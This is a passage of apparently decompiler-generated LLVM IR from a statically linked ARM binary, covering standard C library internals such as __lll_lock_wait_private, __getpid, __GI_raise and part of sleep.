  br i1 %v2_13bcc11, label %dec_label_pc_13bd4, label %dec_label_pc_13b40

dec_label_pc_13bd4:                               ; preds = %dec_label_pc_13bc8, %dec_label_pc_13bccthread-pre-split
  %v0_13bd4.pre = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_13bd4.pre, i32* %r0.global-to-local, align 4
  ret i32 %v0_13bd4.pre

; uselistorder directives
  uselistorder i32 %v0_13bcc.pr, { 1, 0 }
  uselistorder i32 %v3_13bc8, { 1, 2, 0 }
  uselistorder i32 %v1_13b90, { 1, 0, 2, 3 }
  uselistorder i32 %v0_13b8c, { 1, 0, 2 }
  uselistorder i32 %v1_13b70.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_13b10, { 1, 0, 2 }
  uselistorder i32 %v1_13af4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_13ae4, { 1, 0 }
  uselistorder i32 %v0_13988, { 1, 0, 2 }
  uselistorder i32 %v1_1396c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_13944, { 2, 1, 0, 3 }
  uselistorder i32 %v0_1391c, { 1, 0, 2 }
  uselistorder i32 %v1_13900.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v2_138c8, { 1, 0, 2 }
  uselistorder i32 %v0_138a8, { 1, 0, 2 }
  uselistorder i32 %v1_1388c.pre, { 0, 3, 2, 1 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r7.global-to-local, { 14, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 13, 12, 0 }
  uselistorder i32* %r6.global-to-local, { 3, 7, 5, 6, 4, 0, 1, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 8, 7, 9, 10, 12, 11, 13, 14, 16, 15, 17 }
  uselistorder i32* %r3.global-to-local, { 34, 5, 6, 8, 7, 0, 9, 10, 11, 12, 14, 13, 1, 15, 16, 17, 18, 19, 20, 21, 23, 22, 2, 24, 25, 26, 28, 27, 3, 29, 30, 32, 31, 4, 33 }
  uselistorder i32* %r0.global-to-local, { 12, 13, 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 13, 7, 8, 9, 11, 10, 2, 12, 14, 15, 17, 16, 3, 18, 19, 21, 20, 4, 22, 23, 25, 24, 5, 26, 27, 28, 30, 29, 6, 32, 31, 1 }
  uselistorder i32 108, { 4, 5, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_13bd4, { 1, 0 }
  uselistorder label %dec_label_pc_13bc8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_13b90, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13b78, { 1, 0 }
  uselistorder label %bb76, { 1, 0 }
  uselistorder label %dec_label_pc_13b14, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13afc, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_1398c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13974, { 1, 0 }
  uselistorder label %dec_label_pc_13920, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13908, { 1, 0 }
  uselistorder label %bb72, { 1, 0 }
  uselistorder label %dec_label_pc_138ac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13894, { 1, 0 }
  uselistorder label %dec_label_pc_13930.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_13860, { 1, 0 }
}

define i32 @__lll_lock_wait_private(i32* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_13c0c = load i32, i32* @r4, align 4
  store i32 %v3_13c0c, i32* %stack_var_-16, align 4
  %v0_13c10 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13c10, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13c14

dec_label_pc_13c14:                               ; preds = %dec_label_pc_13c94.dec_label_pc_13c14_crit_edge, %entry
  %v0_13c18 = phi i32 [ %v0_13c18.pre, %dec_label_pc_13c94.dec_label_pc_13c14_crit_edge ], [ %v0_13c10, %entry ]
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_13c18, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r4.global-to-local, align 4
  %v1_13c2017 = inttoptr i32 %v0_13c18 to i32*
  %v2_13c2018 = load i32, i32* %v1_13c2017, align 4
  %v3_13c2420 = icmp ne i32 %v2_13c2018, 0
  store i1 %v3_13c2420, i1* %cpsr_c.global-to-local, align 1
  %v9_13c2426 = icmp eq i32 %v2_13c2018, 1
  br i1 %v9_13c2426, label %dec_label_pc_13c2c, label %dec_label_pc_13c44

dec_label_pc_13c2c:                               ; preds = %dec_label_pc_13c14, %dec_label_pc_13c2c.dec_label_pc_13c20_crit_edge
  %v0_13c2c27 = phi i32 [ %v1_13c24.pre, %dec_label_pc_13c2c.dec_label_pc_13c20_crit_edge ], [ 1, %dec_label_pc_13c14 ]
  store i32 %v0_13c2c27, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_13c3c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_13c3c, label %dec_label_pc_13c40, label %dec_label_pc_13c2c.dec_label_pc_13c20_crit_edge

dec_label_pc_13c2c.dec_label_pc_13c20_crit_edge:  ; preds = %dec_label_pc_13c2c
  %v0_13c20.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_13c24.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_13c20 = inttoptr i32 %v0_13c20.pre to i32*
  %v2_13c20 = load i32, i32* %v1_13c20, align 4
  %v3_13c24 = icmp uge i32 %v2_13c20, %v1_13c24.pre
  store i1 %v3_13c24, i1* %cpsr_c.global-to-local, align 1
  %v9_13c24 = icmp eq i32 %v2_13c20, %v1_13c24.pre
  br i1 %v9_13c24, label %dec_label_pc_13c2c, label %dec_label_pc_13c44

dec_label_pc_13c40:                               ; preds = %dec_label_pc_13c2c
  %v0_13c40 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13c44

dec_label_pc_13c44:                               ; preds = %dec_label_pc_13c14, %dec_label_pc_13c2c.dec_label_pc_13c20_crit_edge, %dec_label_pc_13c40
  %v0_13c44 = phi i32 [ %v0_13c40, %dec_label_pc_13c40 ], [ %v2_13c2018, %dec_label_pc_13c14 ], [ %v2_13c20, %dec_label_pc_13c2c.dec_label_pc_13c20_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13c44 = icmp eq i32 %v0_13c44, 0
  %v0_13c68.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_13c44, label %dec_label_pc_13c64, label %dec_label_pc_13c4c

dec_label_pc_13c4c:                               ; preds = %dec_label_pc_13c44
  store i32 %v0_13c68.pre, i32* %r0.global-to-local, align 4
  %v0_13c50 = load i32, i32* %r1.global-to-local, align 4
  %v1_13c50 = add i32 %v0_13c50, 126
  store i32 %v1_13c50, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13c64

dec_label_pc_13c64:                               ; preds = %dec_label_pc_13c44, %dec_label_pc_13c4c
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_13c68.pre, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_13c7028 = inttoptr i32 %v0_13c68.pre to i32*
  %v2_13c7029 = load i32, i32* %v1_13c7028, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_13c7436 = icmp eq i32 %v2_13c7029, 0
  br i1 %v9_13c7436, label %dec_label_pc_13c7c, label %dec_label_pc_13c94

dec_label_pc_13c7c:                               ; preds = %dec_label_pc_13c64, %dec_label_pc_13c7c.dec_label_pc_13c70_crit_edge
  %v0_13c7c37 = phi i32 [ %v1_13c74.pre, %dec_label_pc_13c7c.dec_label_pc_13c70_crit_edge ], [ 0, %dec_label_pc_13c64 ]
  store i32 %v0_13c7c37, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_13c8c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_13c8c, label %dec_label_pc_13c90, label %dec_label_pc_13c7c.dec_label_pc_13c70_crit_edge

dec_label_pc_13c7c.dec_label_pc_13c70_crit_edge:  ; preds = %dec_label_pc_13c7c
  %v0_13c70.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_13c74.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_13c70 = inttoptr i32 %v0_13c70.pre to i32*
  %v2_13c70 = load i32, i32* %v1_13c70, align 4
  %v3_13c74 = icmp uge i32 %v2_13c70, %v1_13c74.pre
  store i1 %v3_13c74, i1* %cpsr_c.global-to-local, align 1
  %v9_13c74 = icmp eq i32 %v2_13c70, %v1_13c74.pre
  br i1 %v9_13c74, label %dec_label_pc_13c7c, label %dec_label_pc_13c94

dec_label_pc_13c90:                               ; preds = %dec_label_pc_13c7c
  %v0_13c90 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13c94

dec_label_pc_13c94:                               ; preds = %dec_label_pc_13c64, %dec_label_pc_13c7c.dec_label_pc_13c70_crit_edge, %dec_label_pc_13c90
  %v0_13c94 = phi i32 [ %v0_13c90, %dec_label_pc_13c90 ], [ %v2_13c7029, %dec_label_pc_13c64 ], [ %v2_13c70, %dec_label_pc_13c7c.dec_label_pc_13c70_crit_edge ]
  %v1_13c94 = phi i32 [ %v0_13c90, %dec_label_pc_13c90 ], [ 0, %dec_label_pc_13c64 ], [ %v1_13c74.pre, %dec_label_pc_13c7c.dec_label_pc_13c70_crit_edge ]
  %v3_13c94 = icmp uge i32 %v0_13c94, %v1_13c94
  store i1 %v3_13c94, i1* %cpsr_c.global-to-local, align 1
  %v9_13c94 = icmp eq i32 %v0_13c94, %v1_13c94
  br i1 %v9_13c94, label %dec_label_pc_13c9c, label %dec_label_pc_13c94.dec_label_pc_13c14_crit_edge

dec_label_pc_13c94.dec_label_pc_13c14_crit_edge:  ; preds = %dec_label_pc_13c94
  %v0_13c18.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13c14

dec_label_pc_13c9c:                               ; preds = %dec_label_pc_13c94
  %v2_13c9c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_13c9c, i32* %r4.global-to-local, align 4
  %v1_13ca0 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_13ca0

; uselistorder directives
  uselistorder i32 %v0_13c90, { 1, 0 }
  uselistorder i32 %v1_13c74.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_13c24.pre, { 2, 1, 0 }
  uselistorder i32 %v2_13c2018, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 4, 3, 1, 5, 7, 6, 0 }
  uselistorder i32 126, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13c94, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13c7c, { 1, 0 }
  uselistorder label %dec_label_pc_13c64, { 1, 0 }
  uselistorder label %dec_label_pc_13c44, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13c2c, { 1, 0 }
}

define i32 @__getpid(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13ca4 = load i32, i32* @r7, align 4
  store i32 %v3_13ca4, i32* %stack_var_-8, align 4
  %v0_13ca8 = call i32 @__aeabi_read_tp()
  store i32 %v0_13ca8, i32* %r0.global-to-local, align 4
  %v1_13cac = add i32 %v0_13ca8, -1060
  %v2_13cac = inttoptr i32 %v1_13cac to i32*
  %v3_13cac = load i32, i32* %v2_13cac, align 4
  %tmp7 = icmp slt i32 %v3_13cac, 1
  br i1 %tmp7, label %dec_label_pc_13cbc, label %dec_label_pc_13ce0

dec_label_pc_13cbc:                               ; preds = %entry
  %v2_13cb0 = icmp eq i32 %v3_13cac, 0
  br i1 %v2_13cb0, label %dec_label_pc_13cc0, label %dec_label_pc_13ccc

dec_label_pc_13cc0:                               ; preds = %dec_label_pc_13cbc
  %v1_13cc0 = add i32 %v0_13ca8, -1064
  %v2_13cc0 = inttoptr i32 %v1_13cc0 to i32*
  %v3_13cc0 = load i32, i32* %v2_13cc0, align 4
  store i32 %v3_13cc0, i32* %r0.global-to-local, align 4
  %v2_13cc4 = icmp eq i32 %v3_13cc0, 0
  br i1 %v2_13cc4, label %bb, label %bb8

dec_label_pc_13ccc:                               ; preds = %dec_label_pc_13cbc
  br label %bb8

bb:                                               ; preds = %dec_label_pc_13cc0
  store i32 0, i32* %v2_13cc0, align 4
  %v0_13cdc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %dec_label_pc_13ccc, %dec_label_pc_13cc0, %bb
  %v0_13cdc = phi i32 [ %v3_13cc0, %dec_label_pc_13cc0 ], [ %v0_13ca8, %dec_label_pc_13ccc ], [ %v0_13cdc.pre, %bb ]
  br label %dec_label_pc_13ce0

dec_label_pc_13ce0:                               ; preds = %entry, %bb8
  %v0_13ce0 = phi i32 [ %v3_13cac, %entry ], [ %v0_13cdc, %bb8 ]
  store i32 %v0_13ce0, i32* %r0.global-to-local, align 4
  %v2_13ce4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13ce4, i32* @r7, align 4
  ret i32 %v0_13ce0

; uselistorder directives
  uselistorder i32 %v0_13ce0, { 1, 0 }
  uselistorder i32 %v3_13cac, { 1, 2, 0 }
  uselistorder label %dec_label_pc_13ce0, { 1, 0 }
  uselistorder label %bb8, { 2, 0, 1 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_13cec = load i32, i32* @r4, align 4
  store i32 %v3_13cec, i32* %stack_var_-20, align 4
  %v0_13cf4 = call i32 @__aeabi_read_tp()
  store i32 %v0_13cf4, i32* %r0.global-to-local, align 4
  %v1_13cf8 = add i32 %v0_13cf4, -1064
  %v2_13cf8 = inttoptr i32 %v1_13cf8 to i32*
  %v3_13cf8 = load i32, i32* %v2_13cf8, align 4
  store i32 %v3_13cf8, i32* %r4.global-to-local, align 4
  %v2_13cfc = icmp eq i32 %v3_13cf8, 0
  %v1_13d04 = add i32 %v0_13cf4, -1060
  %v2_13d04 = inttoptr i32 %v1_13d04 to i32*
  %v3_13d04 = load i32, i32* %v2_13d04, align 4
  store i32 %v3_13d04, i32* %r0.global-to-local, align 4
  br i1 %v2_13cfc, label %dec_label_pc_13d0c, label %dec_label_pc_13d20

dec_label_pc_13d0c:                               ; preds = %entry
  store i32 %v3_13d04, i32* %r4.global-to-local, align 4
  store i32 %v3_13d04, i32* %v2_13cf8, align 4
  %v0_13d48.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb28

dec_label_pc_13d20:                               ; preds = %entry
  %v5_13d24 = icmp sgt i32 %v3_13d04, 0
  br i1 %v5_13d24, label %bb28, label %dec_label_pc_13d28

dec_label_pc_13d28:                               ; preds = %dec_label_pc_13d20
  %tmp = bitcast i32 %v3_13d04 to float
  %tmp30 = call float @fabsf(float %tmp)
  %v1_13d28 = bitcast float %tmp30 to i32
  %v2_13d2c = icmp eq i32 %v1_13d28, 0
  br i1 %v2_13d2c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13d28
  store i32 %v3_13cf8, i32* %r0.global-to-local, align 4
  br label %bb28

.thread:                                          ; preds = %dec_label_pc_13d28
  %v2_13d34 = sub i32 0, %v3_13d04
  store i32 %v2_13d34, i32* %r0.global-to-local, align 4
  br label %bb28

bb28:                                             ; preds = %bb, %dec_label_pc_13d20, %dec_label_pc_13d0c, %.thread
  %v0_13d4c = phi i32 [ %v3_13d04, %dec_label_pc_13d20 ], [ %v0_13d48.pre, %dec_label_pc_13d0c ], [ %v3_13cf8, %bb ], [ %v2_13d34, %.thread ]
  store i32 %v0_13d4c, i32* %r2.global-to-local, align 4
  %tmp31 = icmp ult i32 %v0_13d4c, -4095
  br i1 %tmp31, label %dec_label_pc_13d70, label %dec_label_pc_13d58

dec_label_pc_13d58:                               ; preds = %bb28
  %v0_13d5c = call i32 @__aeabi_read_tp()
  %v3_13d60 = load i16, i16* @global_var_216f0.341, align 2
  %v4_13d60 = sext i16 %v3_13d60 to i32
  %v0_13d64 = load i32, i32* %r2.global-to-local, align 4
  %v1_13d64 = sub i32 0, %v0_13d64
  store i32 %v1_13d64, i32* %r2.global-to-local, align 4
  %v3_13d68 = add i32 %v4_13d60, %v0_13d5c
  %v4_13d68 = inttoptr i32 %v3_13d68 to i32*
  store i32 %v1_13d64, i32* %v4_13d68, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13d70

dec_label_pc_13d70:                               ; preds = %bb28, %dec_label_pc_13d58
  %v0_13d74 = phi i32 [ %v0_13d4c, %bb28 ], [ -1, %dec_label_pc_13d58 ]
  %v3_13d70 = icmp eq i32 %v0_13d74, -1
  store i32 %v0_13d74, i32* %r5.global-to-local, align 4
  br i1 %v3_13d70, label %dec_label_pc_13d7c, label %dec_label_pc_13dc4

dec_label_pc_13d7c:                               ; preds = %dec_label_pc_13d70
  %v0_13d80 = call i32 @__aeabi_read_tp()
  store i32 %v0_13d80, i32* %r0.global-to-local, align 4
  %v3_13d84 = load i16, i16* @global_var_216f0.341, align 2
  %v4_13d84 = sext i16 %v3_13d84 to i32
  %v2_13d88 = add i32 %v4_13d84, %v0_13d80
  %v3_13d88 = inttoptr i32 %v2_13d88 to i32*
  %v4_13d88 = load i32, i32* %v3_13d88, align 4
  %v7_13d8c = icmp eq i32 %v4_13d88, 38
  br i1 %v7_13d8c, label %dec_label_pc_13d98, label %dec_label_pc_13d7c.dec_label_pc_13dc4_crit_edge

dec_label_pc_13d7c.dec_label_pc_13dc4_crit_edge:  ; preds = %dec_label_pc_13d7c
  %v0_13dc4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13dc4

dec_label_pc_13d98:                               ; preds = %dec_label_pc_13d7c
  %v0_13d98 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13d98, i32* %r0.global-to-local, align 4
  %tmp32 = icmp ugt i32 %v0_13d98, -4096
  br i1 %tmp32, label %bb29, label %.thread22

bb29:                                             ; preds = %dec_label_pc_13d98
  %v5_13db0 = sub i32 0, %v0_13d98
  store i32 %v5_13db0, i32* %r2.global-to-local, align 4
  %v7_13db4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_13dbc.518 to i32), i32 55604) to i32*), align 4
  %v4_13db8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v4_13db8, i32* %r0.global-to-local, align 4
  %v7_13dbc = add i32 %v7_13db4, %v0_13d80
  %v8_13dbc = inttoptr i32 %v7_13dbc to i32*
  store i32 %v5_13db0, i32* %v8_13dbc, align 4
  %v0_13dc0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread22

.thread22:                                        ; preds = %dec_label_pc_13d98, %bb29
  %v0_13dc0 = phi i32 [ %v0_13dc0.pre, %bb29 ], [ %v0_13d98, %dec_label_pc_13d98 ]
  store i32 %v0_13dc0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13dc4

dec_label_pc_13dc4:                               ; preds = %dec_label_pc_13d7c.dec_label_pc_13dc4_crit_edge, %dec_label_pc_13d70, %.thread22
  %v0_13dc4 = phi i32 [ %v0_13dc4.pre, %dec_label_pc_13d7c.dec_label_pc_13dc4_crit_edge ], [ %v0_13d74, %dec_label_pc_13d70 ], [ %v0_13dc0, %.thread22 ]
  store i32 %v0_13dc4, i32* %r0.global-to-local, align 4
  %v2_13dc8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_13dc8, i32* @r4, align 4
  ret i32 %v0_13dc4

; uselistorder directives
  uselistorder i32 %v0_13dc4, { 1, 0 }
  uselistorder i32 %v0_13d98, { 1, 2, 0, 3 }
  uselistorder i32 %v0_13d4c, { 2, 0, 1 }
  uselistorder i32 %v3_13d04, { 2, 1, 0, 5, 4, 3, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 38, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 -1060, { 1, 0 }
  uselistorder i32 -1064, { 1, 0 }
  uselistorder label %dec_label_pc_13dc4, { 2, 0, 1 }
  uselistorder label %.thread22, { 1, 0 }
  uselistorder label %dec_label_pc_13d70, { 1, 0 }
  uselistorder label %bb28, { 3, 0, 1, 2 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_13ddc = load i32, i32* @r4, align 4
  %v6_13ddc = load i32, i32* @r5, align 4
  %v9_13ddc = load i32, i32* @r6, align 4
  %v12_13ddc = load i32, i32* @r7, align 4
  %v15_13ddc = load i32, i32* @lr, align 4
  store i32 0, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13dec = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* @r7, align 4
  store i32 %arg1, i32* %stack_var_-32, align 4
  br i1 %v2_13dec, label %dec_label_pc_13e00, label %dec_label_pc_13e74

dec_label_pc_13e00:                               ; preds = %entry
  %v0_13e00 = call i32 @__aeabi_read_tp()
  %v1_13e04 = add i32 %v0_13e00, -1036
  %v2_13e04 = inttoptr i32 %v1_13e04 to i32*
  %v3_13e04 = load i32, i32* %v2_13e04, align 4
  %v1_13e08 = and i32 %v3_13e04, -71
  %v2_13e0c = icmp ugt i32 %v1_13e08, 7
  store i1 %v2_13e0c, i1* %cpsr_c.global-to-local, align 1
  %v7_13e0c = icmp eq i32 %v1_13e08, 8
  %v1_13e10 = add i32 %v0_13e00, -1168
  store i32 %v1_13e10, i32* @r5, align 4
  br i1 %v7_13e0c, label %dec_label_pc_13e18, label %dec_label_pc_13eec

dec_label_pc_13e18:                               ; preds = %dec_label_pc_13e00
  %v2_13e1c = add i32 %v0_13e00, -624
  %v3_13e1c = inttoptr i32 %v2_13e1c to i32*
  store i32 -1, i32* %v3_13e1c, align 4
  %v0_13e20 = load i32, i32* @r5, align 4
  %v1_13e20 = add i32 %v0_13e20, 132
  store i32 %v1_13e20, i32* @r6, align 4
  br label %dec_label_pc_13e24

dec_label_pc_13e24:                               ; preds = %dec_label_pc_13e58.dec_label_pc_13e24_crit_edge, %dec_label_pc_13e18
  %v0_13e28 = phi i32 [ %v0_13e28.pre, %dec_label_pc_13e58.dec_label_pc_13e24_crit_edge ], [ %v1_13e20, %dec_label_pc_13e18 ]
  %v0_13e24 = phi i32 [ %v0_13e60, %dec_label_pc_13e58.dec_label_pc_13e24_crit_edge ], [ %v0_13e20, %dec_label_pc_13e18 ]
  %v1_13e24 = add i32 %v0_13e24, 132
  %v2_13e24 = inttoptr i32 %v1_13e24 to i32*
  %v3_13e24 = load i32, i32* %v2_13e24, align 4
  store i32 %v0_13e28, i32* %r2.global-to-local, align 4
  store i32 %v3_13e24, i32* @r4, align 4
  %v1_13e3430 = inttoptr i32 %v0_13e28 to i32*
  %v2_13e3431 = load i32, i32* %v1_13e3430, align 4
  %v3_13e3833 = icmp uge i32 %v2_13e3431, %v3_13e24
  store i1 %v3_13e3833, i1* %cpsr_c.global-to-local, align 1
  %v9_13e3839 = icmp eq i32 %v2_13e3431, %v3_13e24
  br i1 %v9_13e3839, label %dec_label_pc_13e40, label %dec_label_pc_13e58

dec_label_pc_13e40:                               ; preds = %dec_label_pc_13e24, %dec_label_pc_13e40.dec_label_pc_13e34_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_13e50 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_13e50, label %dec_label_pc_13e54, label %dec_label_pc_13e40.dec_label_pc_13e34_crit_edge

dec_label_pc_13e40.dec_label_pc_13e34_crit_edge:  ; preds = %dec_label_pc_13e40
  %v0_13e34.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_13e38.pre = load i32, i32* @r4, align 4
  %v1_13e34 = inttoptr i32 %v0_13e34.pre to i32*
  %v2_13e34 = load i32, i32* %v1_13e34, align 4
  %v3_13e38 = icmp uge i32 %v2_13e34, %v1_13e38.pre
  store i1 %v3_13e38, i1* %cpsr_c.global-to-local, align 1
  %v9_13e38 = icmp eq i32 %v2_13e34, %v1_13e38.pre
  br i1 %v9_13e38, label %dec_label_pc_13e40, label %dec_label_pc_13e58

dec_label_pc_13e54:                               ; preds = %dec_label_pc_13e40
  %v0_13e54 = load i32, i32* @r4, align 4
  br label %dec_label_pc_13e58

dec_label_pc_13e58:                               ; preds = %dec_label_pc_13e24, %dec_label_pc_13e40.dec_label_pc_13e34_crit_edge, %dec_label_pc_13e54
  %v0_13e58 = phi i32 [ %v0_13e54, %dec_label_pc_13e54 ], [ %v2_13e3431, %dec_label_pc_13e24 ], [ %v2_13e34, %dec_label_pc_13e40.dec_label_pc_13e34_crit_edge ]
  %v1_13e58 = phi i32 [ %v0_13e54, %dec_label_pc_13e54 ], [ %v3_13e24, %dec_label_pc_13e24 ], [ %v1_13e38.pre, %dec_label_pc_13e40.dec_label_pc_13e34_crit_edge ]
  %v3_13e58 = icmp uge i32 %v0_13e58, %v1_13e58
  store i1 %v3_13e58, i1* %cpsr_c.global-to-local, align 1
  %v9_13e58 = icmp eq i32 %v0_13e58, %v1_13e58
  br i1 %v9_13e58, label %dec_label_pc_13e60, label %dec_label_pc_13e58.dec_label_pc_13e24_crit_edge

dec_label_pc_13e58.dec_label_pc_13e24_crit_edge:  ; preds = %dec_label_pc_13e58
  %v0_13e60 = load i32, i32* @r5, align 4
  %v0_13e28.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_13e24

dec_label_pc_13e60:                               ; preds = %dec_label_pc_13e58
  %v0_13e68 = load i32, i32* @r7, align 4
  %v2_13e68 = add i32 %v0_13e68, 116
  %v3_13e68 = inttoptr i32 %v2_13e68 to i32*
  %v4_13e68 = load i32, i32* %v3_13e68, align 4
  store i32 81524, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13e68)
  %v0_13e7c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13e74

dec_label_pc_13e74:                               ; preds = %entry, %dec_label_pc_13e60
  %v0_13e7c = phi i32 [ 0, %entry ], [ %v0_13e7c.pre, %dec_label_pc_13e60 ]
  %v2_13e80 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_13e80, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %stack_var_-40, align 4
  %v3_13e8c = call i32 @__libc_sigaction(i32 17, i32 %v0_13e7c, i32 %v2_13e80)
  %v3_13e90 = load i32, i32* %stack_var_-60, align 4
  %v2_13e94 = icmp ne i32 %v3_13e90, 0
  store i1 %v2_13e94, i1* %cpsr_c.global-to-local, align 1
  %v7_13e94 = icmp eq i32 %v3_13e90, 1
  br i1 %v7_13e94, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_13e74
  %v3_13e98 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v3_13e98, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_13e74, %bb
  call void @__pseudo_cond_branch(i1 %v7_13e94, i32 ptrtoint (i32* @global_var_10bac.522 to i32))
  %v2_13ea8 = ptrtoint i32* %stack_var_-32 to i32
  %v2_13eb0 = call i32 @__libc_nanosleep(i32 %v2_13ea8, i32 %v2_13ea8)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13eb4 = icmp eq i32 %v2_13eb0, 0
  br i1 %v2_13eb4, label %bb26, label %bb25

bb25:                                             ; preds = %.thread1
  store i32 0, i32* @r1, align 4
  store i32 499999999, i32* %r2.global-to-local, align 4
  %v3_13ec8 = load i32, i32* %stack_var_-32, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  br label %bb26

bb26:                                             ; preds = %.thread1, %bb25
  %storemerge = phi i32 [ %v3_13ec8, %bb25 ], [ 0, %.thread1 ]
  store i32 %storemerge, i32* @r4, align 4
  %v3_13ed8 = load i32, i32* %stack_var_-40, align 4
  %v1_13edc = and i32 %v3_13ed8, 65536
  store i32 %v1_13edc, i32* %r2.global-to-local, align 4
  %v2_13edc = icmp eq i32 %v1_13edc, 0
  br i1 %v2_13edc, label %bb27, label %.thread5

bb27:                                             ; preds = %bb26
  %v3_13ee4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v3_13ee4, i32* @r1, align 4
  br label %.thread5

.thread5:                                         ; preds = %bb26, %bb27
